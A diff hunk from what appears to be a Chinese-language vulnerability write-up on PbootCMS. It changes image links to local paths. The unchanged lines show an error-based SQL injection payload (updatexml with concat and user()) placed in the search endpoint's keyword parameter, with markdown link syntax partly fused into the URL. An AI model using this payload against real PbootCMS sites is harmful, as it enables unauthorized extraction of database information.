@@ -20,10 +20,10 @@ app="PBOOTCMS"
 
 搜索框页面为
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170924485.png)Payload为
+![](./images/202202170924485.png)Payload为
 
 ```plain
 /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170924075.png)
+![](./images/202202170924075.png)
